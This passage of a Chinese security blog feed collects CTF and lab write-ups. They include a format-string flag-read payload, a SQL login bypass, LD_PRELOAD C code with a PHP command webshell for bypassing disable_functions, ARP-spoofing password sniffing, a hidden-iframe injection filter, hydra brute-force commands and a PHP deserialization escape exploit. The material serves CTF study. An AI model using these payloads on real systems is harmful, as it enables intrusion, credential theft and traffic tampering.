filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)            output += filepath            output += &#39;\r\n\r\nThe content is:\r\n&#39;            try:                f = open(filepath,&#39;r&#39;)                content = f.read()                f.close()            except:                content = &#39;can\&#39;t read&#39;            output += content            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;            output += &#39; &#39;.join(current_folder_file)            return output</code></pre><p>过滤掉了 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812648124.png" alt></p><p>看到 <code>current_folder_file</code> 是 global 的</p><p>所以读一次根目录的文件，让<code>current_folder_file</code> 里面有 <code>fl4g</code></p><p><img src="/posts/2f3193b1/0-1583812681289.png" alt></p><pre><code>/?head=\&amp;url=http://localhost:8080/read/file=/{vipfile.__class__.GetName.__globals__[current_folder_file][21]}/flag%26vipcode=m3O5PGEBMnbX0N8ugWlIoijtFaS9KsqVAQdvZyT1cheCxpwf&amp;begin=%s%</code></pre><p>或者这个</p><pre><code>http://121.37.179.47:1101/?head=\&amp;begin=%1$s&amp;url=http://127.0.0.1:8080/read/file={vipfile.__class__.__init__.__globals__[__name__][9]}l4g_1s_h3re_u_wi11_rua/flag%26vipcode=kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</code></pre><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>false注入</p><p><code>username=&#39;%&#39;1&amp;password=&#39;%&#39;1</code></p><p>即可</p><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;hackme&quot;&gt;&lt;a href=&quot;#hackme&quot; class=&quot;headerlink&quot; title=&quot;hackme&quot;&gt;&lt;/a&gt;hackme&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.zip源码，审计之后看到两个很有意思的操作&quot; target=&quot;_bl
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="比赛" scheme="http://prontosil.com/tags/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>命令执行进阶</title>
    <link href="http://prontosil.com/posts/137d2c1/"/>
    <id>http://prontosil.com/posts/137d2c1/</id>
    <published>2020-03-10T01:08:59.000Z</published>
    <updated>2020-03-10T05:34:21.461Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>绕过disable_function总结</title>
    <link href="http://prontosil.com/posts/1cc6bf70/"/>
    <id>http://prontosil.com/posts/1cc6bf70/</id>
    <published>2020-03-08T06:17:38.000Z</published>
    <updated>2020-03-10T05:34:21.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>有一部分CTF题目，当你拿到webshell，蚁剑连接上去之后，却不能执行系统命令，这就是要绕过 <code>disable_function</code> 了</p><p><img src="/posts/1cc6bf70/1583650697704.png" alt="、"></p><p>可以看到禁用了很多函数</p><pre><code>apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system</code></pre><h2 id="LD-PRELOAD-劫持系统函数"><a href="#LD-PRELOAD-劫持系统函数" class="headerlink" title="LD_PRELOAD 劫持系统函数"></a>LD_PRELOAD 劫持系统函数</h2><blockquote><p>LD_PRELOAD 是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。</p></blockquote><p>所以我们就可以通过利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意的.so文件，达到执行系统命令的效果</p><p>例如：</p><pre><code>$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls</code></pre><p>即在执行<code>ls</code>命令前，会先加载指定路径的<code>malloc.so</code>文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p><p>我们可以通过<code>readelf</code>命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用<code>LD_PRELOAD</code>环境变量指定生成的对象，达到命令执行的目的。</p><h3 id="一个简单的劫持示例"><a href="#一个简单的劫持示例" class="headerlink" title="一个简单的劫持示例"></a>一个简单的劫持示例</h3><p><code>getpid.c</code> 的内容如下</p><pre><code class="C">#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned by getpid!&#39;&quot;);}pid_t getpid(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return 0;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return 0;}</code></pre><p>我们在这里劫持了 <code>getpid</code> 函数，由于python运行的时候使用了 <code>getpid</code> 函数，所以可以通过 <code>LD_PRELODAD</code> 来执行任意命令</p><pre><code>gcc -shared -fPIC getpid.c -o getpid.soLD_PRELOAD=./getpid.so python</code></pre><p>执行效果</p><p><img src="/posts/1cc6bf70/1583651075354.png" alt></p><p>注意：因为通过设置<code>preload</code>劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时<code>unsetenv(&quot;LD_PRELOAD&quot;)</code>则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，</p><p>所以绕过php disable_function也就比较简单了</p><blockquote><p>php中的mail、error_log函数是通过调用系统中的sendmail命令实现的(其他类似php中的函数还有imap_mail、mb_send_mail<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">参考</a>)，sendmail二进制文件中使用了getuid库函数，这样我们可以覆盖getuid函数。</p></blockquote><p>写一个 <code>getuid</code> </p><pre><code class="C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int  getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><p><code>gcc -shared -fPIC geteuid.c -o getuid.so</code> 编译成动态链接库。</p><p>然后再写一个php文件，设置好 <code>EVIL_CMDLINE</code> 环境变量，同时需要执行 so 文件地址</p><pre><code class="php">&lt;?php    $cmd = $_REQUEST[&quot;cmd&quot;];    $out_path = $_REQUEST[&quot;outpath&quot;];    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    $so_path = $_REQUEST[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD=&quot; . $so_path);    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;  ?&gt;</code></pre><h2 id="无需劫持函数绕过-disable-function"><a href="#无需劫持函数绕过-disable-function" class="headerlink" title="无需劫持函数绕过 disable_function"></a>无需劫持函数绕过 disable_function</h2><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?files=1&tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">下载地址</a></p><blockquote><p>GCC 有个 C 语言扩展修饰符<strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行<strong>attribute</strong>((constructor)) 修饰的函数。</p></blockquote><p>于是修改一下原来的共享链接库代码</p><pre><code class="C">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void getuid() {const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; }unsetenv(&quot;LD_PRELOAD&quot;);system(cmdline);}</code></pre><blockquote><p>这意味着，我们只需要找到该php环境中存在执行系统命令的函数、且putenv函数未被禁用的情况下，就可以绕过disable_function。</p></blockquote><p>演示一下</p><pre><code class="C">#include &lt;unistd.h&gt;void payload(void){    system(&quot;echo &#39;pwned!&#39;&quot;);}__attribute__ ((__constructor__)) void exec(void){    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){        return;    }    unsetenv(&quot;LD_PRELOAD&quot;);    payload();    return;}</code></pre><p><img src="/posts/1cc6bf70/1583651506472.png" alt></p><h2 id="php7绕过disable-funtion"><a href="#php7绕过disable-funtion" class="headerlink" title="php7绕过disable_funtion"></a>php7绕过disable_funtion</h2><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">脚本地址</a></p><h2 id="ctfhub题目"><a href="#ctfhub题目" class="headerlink" title="ctfhub题目"></a>ctfhub题目</h2><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>使用蚁剑连接之后，直接加载插件，之后生成一个 <code>.antproxy.php</code> ，选择这个文件连接即可(密码不变)</p><p><img src="/posts/1cc6bf70/1583651719652.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kylingit.com/blog/利用ld_preload绕过disbale_functions/" target="_blank" rel="noopener">https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</a></p><p><a href="https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD劫持系统函数.html" target="_blank" rel="noopener">https://j7ur8.github.io/WebBook/PHP/LD_PRELOAD%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0.html</a></p><p><a href="https://blog.szfszf.top/article/37/" target="_blank" rel="noopener">https://blog.szfszf.top/article/37/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;有一部分CTF题目，当你拿到webshell，蚁剑连接上去之后，却不能执行系统命令，这就是要绕过 &lt;code&gt;disable
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://prontosil.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>网络侦察实验</title>
    <link href="http://prontosil.com/posts/ea51772/"/>
    <id>http://prontosil.com/posts/ea51772/</id>
    <published>2020-03-05T06:55:44.000Z</published>
    <updated>2020-03-06T04:41:52.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务一-使用nmap-ettercap进行网络侦查和密码嗅探"><a href="#任务一-使用nmap-ettercap进行网络侦查和密码嗅探" class="headerlink" title="任务一  使用nmap,ettercap进行网络侦查和密码嗅探"></a>任务一  使用nmap,ettercap进行网络侦查和密码嗅探</h2><p>ettercap使用</p><p>常用参数</p><ul><li>-l 显示可用网卡</li><li>-i 选择网卡</li><li>-t 协议选择，tcp/udp/all</li><li>-p 不进行毒化攻击，只用来嗅探</li><li>-F 载入过滤器文件</li><li>-V text 将数据包以文本形式显示在屏幕上</li></ul><p><code>ettercap -Tzq</code> 以命令行显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息</p><p>具体到这个实验，需要使用ettercap去捕获ftp登陆的用户名和口令。其中，192.168.1.3 开放了ftp端口，所以尝试多次之后</p><pre><code>ettercap -i eth1 -Tq -L sniffeddata -M arp:remote //192.168.1.3/21//</code></pre><p><img src="/posts/ea51772/Image.png" alt></p><p>然后就抓到密码了</p><p><img src="/posts/ea51772/Image-1583392370959.png" alt></p><p>ettercap过滤脚本：</p><pre><code> if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.dst == 80 || tcp.dst == 8080) {      #...and if it contains an Accept-Encoding header...      if (search(DATA.data, &quot;Accept-Encoding&quot;)) {      #...remove any Encoding (make sure we are using plain text)      replace(&quot;Accept-Encoding&quot;, &quot;Accept-Nothing!&quot;);        }    }    #--Inject Iframe--    if (ip.proto == TCP &amp;&amp; ip.dst != &#39;192.1.1.200&#39; &amp;&amp; tcp.src == 80 || tcp.src == 8080) {       if (search(DATA.data, &quot;&lt;body&gt;&quot;)){           #Replace it with the body tag and an iframe to our attacking webpage           replace(&quot;&lt;body&gt;&quot;,&quot;&lt;body&gt;&lt;iframe src=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;body&gt;\n&quot;);       }       if (search(DATA.data, &quot;&lt;BODY&gt;&quot;)){           replace(&quot;&lt;BODY&gt;&quot;,&quot;&lt;BODY&gt;&lt;IFRAME SRC=&#39;http://192.1.1.200&#39; width=0 height=0 /&gt;&quot;);           msg(&quot;iframe injected after &lt;BODY&gt;\n&quot;);       }   }</code></pre><p>第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。</BODY></body></p><p>基本语法</p><pre><code>Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。编译过滤规则的命令是：etterfilter filter.ecf -o filter.ef。即把filter.ecf文件编译成ettercap能识别的filter.ef文件。过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。Ettercap提供的一些常用的函数有：search(where, what) 从字符串where中查找what，若找到则返回trueregex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回truereplace(what, with) 把字符串what替换成字符串withlog(what, where) 把字符串what记录到where文件中msg(message) 在屏幕上显示出字符串messageexit() 退出</code></pre><p>（当然这里不用这么复杂啦</p><h2 id="任务二-使用crunch，hydra暴力破解ssh服务"><a href="#任务二-使用crunch，hydra暴力破解ssh服务" class="headerlink" title="任务二 使用crunch，hydra暴力破解ssh服务"></a>任务二 使用crunch，hydra暴力破解ssh服务</h2><p>crunch的基本用法</p><p>*　　-b #体积大小，比如后跟20mib<br>*　　-c #密码个数（行数），比如8000<br>*　　-d #限制出现相同元素的个数（即至少出现元素个数），-d 3就不会出现zzf ffffgggg之类的<br>*　　-e #定义停止生成密码 ，比如-e 222222：到222222停止生成密码<br>*　　-f #调用密码库文件，比如/usr/share/crunch/charset.lst<br>*　　-i #改变输出格式<br>*　　-l #与-t搭配使用<br>*　　-m #与-p搭配使用<br>*　　-o #保存为<br>*　　-p #定义密码元素<br>*　　-q #读取字典<br>*　　-r #定义从某一个地方重新开始<br>*　　-s #第一个密码，从xxx开始<br>*　　-t #定义输出格式</p><p>hydra爆破的用法</p><ul><li>破解ssh</li></ul><p><code>hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</code></p><ul><li>破解ftp</li></ul><p><code>hydra ip ftp -l 用户名 -P 密码字典 -t线程(默认16) -vV</code></p><ul><li>破解rdp</li></ul><p><code>hydra ip rdp -l administrator -P pass.txt -V</code></p><ul><li>破解telnet</li></ul><p><code>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</code></p><p>当然这里我们直接社工吧。。hacker123</p><h2 id="任务三-使用ssh登陆"><a href="#任务三-使用ssh登陆" class="headerlink" title="任务三 使用ssh登陆"></a>任务三 使用ssh登陆</h2><p>不说了。。</p><h2 id="任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息"><a href="#任务四-获取目标网站的webshell权限，控制目标机，获得敏感信息" class="headerlink" title="任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息"></a>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务一-使用nmap-ettercap进行网络侦查和密码嗅探&quot;&gt;&lt;a href=&quot;#任务一-使用nmap-ettercap进行网络侦查和密码嗅探&quot; class=&quot;headerlink&quot; title=&quot;任务一  使用nmap,ettercap进行网络侦查和密码嗅探&quot;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>反序列化导致字符的逃逸</title>
    <link href="http://prontosil.com/posts/bdd52bdc/"/>
    <id>http://prontosil.com/posts/bdd52bdc/</id>
    <published>2020-03-04T23:53:29.000Z</published>
    <updated>2020-03-06T04:41:11.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p><p>这个点很神奇，</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><pre><code class="php">&lt;?phpfunction filter($string){    return preg_match(&#39;/x/&#39;,&#39;yy&#39;,$string);}$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#39;\n&#39;;$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>这里将 <code>x</code> 替换为 <code>yy</code>,也就是变长了，正常的序列化数据为</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>如果我们可以控制用户名去修改密码，那么应该是这样的</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>(尤其注意这里的双引号)</p><p><code>peri0d</code> 长度为6，<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 长度为20</p><p>x替换为yy，长度由原来的1变为2，那么我们这里设填充为z,满足</p><p>6+20+z = 6+2z，得到的z就是20，所以填充x为20即可</p><pre><code class="php">$username = &quot;peri0d&quot;;$payload = &#39;&quot;;i:1;s:6:&quot;123456&quot;;}&#39;;$x = str_repeat(&quot;x&quot;,20);$username = $username.$x.$payload;$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>结果</p><pre><code>&quot;a:2:{i:0;s:46:&quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&quot;array(2) {  [0] =&gt;  string(46) &quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;  [1] =&gt;  string(6) &quot;123456&quot;}</code></pre><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p>安洵杯 easy_serialize_php</p><p>代码如下</p><pre><code class="php"> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));} </code></pre><p>flag 在 <code>d0g3_f1ag.php</code> 这个文件中</p><p><code>$_SESSION</code> 数组中有 <code>user, funciton, img</code> 这三个属性</p><p>最后读文件的文件名是 <code>$_SESSION[&#39;img&#39;]</code> ，如果能够控制这个属性就好了，但是</p><pre><code class="php">if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}</code></pre><p>显然 <code>sha1</code> 的数据你是没法控制的，那怎么搞呢</p><p>重点在这里</p><pre><code class="php">$serialize_info = filter(serialize($_SESSION));</code></pre><p>序列化之后经过了一次过滤</p><p>而 <code>extract($_POST);</code> 使得我们可以控制 <code>$_SESSION</code> 数组中的 <code>user</code> 和 <code>function</code></p><p>先测试一下正常的一段序列化字符：</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>能不能控制好user和function，使得加上一个我们控制好的img</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;};s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>这样反序列化的时候最后的那个 img属性就是多余的了，我们来计算一下怎么利用过滤来达到目的</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;2333&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));// var_dump(unserialize($a));</code></pre><p>此时生成的是</p><pre><code>a:3:{s:4:&quot;user&quot;;s:4:&quot;2333&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>我们要让 <code>&quot;;s:8:&quot;function&quot;;s:61:&quot;a</code> 这段字符被吃掉，成为 <code>user</code> 的值，算一下长度24，正好是6个flag</p><p>所以</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));var_dump(unserialize($a));</code></pre><p>这时候得到的结果</p><pre><code class="php">a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>再进行反序列化</p><pre><code>array(3) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;  &#39;img&#39; =&gt;  string(20) &quot;ZDBnM19mMWFnLnBocAo=&quot;  &#39;dd&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>可以看到成功地覆盖了img属性</p><p>ps,又测试了一下如果有两个img属性会怎么搞</p><pre><code class="php">$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:3:&quot;img&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;</code></pre><p>得到的结果是：</p><pre><code class="php">array(2) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:62:&quot;a&quot;  &#39;img&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>此时img属性被合并了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;PHP 在反序列化时，&lt;strong&gt;对类中不存在的属性也会进行反序列化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个点很神奇，&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="反序列化" scheme="http://prontosil.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="CTF" scheme="http://prontosil.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>文明六玩后感</title>
    <link href="http://prontosil.com/posts/61b7ba22/"/>
    <id>http://prontosil.com/posts/61b7ba22/</id>
    <published>2020-03-04T04:04:35.000Z</published>
    <updated>2020-03-05T06:21:11.702Z</updated>
    
    <content type="html"><![CDATA[<p>完了一段的时间的文明六，（虽然才48个小时</p><p><img src="/posts/61b7ba22/1583294758274.png" alt></p><h2 id="总体感觉"><a href="#总体感觉" class="headerlink" title="总体感觉"></a>总体感觉</h2><p>一开始玩这个游戏有点不知所措，因为这个游戏的信息量实在是太大了，后来慢慢地从别人的视频中才逐渐的熟悉起来。</p><p>文明六大概分为几个部分吧，首先是最基本的城市，可以建造区域，练兵，造工人，开拓者。然后是</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;完了一段的时间的文明六，（虽然才48个小时&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/61b7ba22/1583294758274.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;总体感觉&quot;&gt;&lt;a href=&quot;#总体感觉&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
      <category term="生活" scheme="http://prontosil.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="游戏" scheme="http://prontosil.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶机渗透-DC-8</title>
    <link href="http://prontosil.com/posts/24a0544e/"/>
    <id>http://prontosil.com/posts/24a0544e/</id>
    <published>2020-03-02T13:02:00.000Z</published>
    <updated>2020-03-03T06:46:21.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><pre><code>PORT   STATE SERVICE  VERSION22/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  ssl/http Apache|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 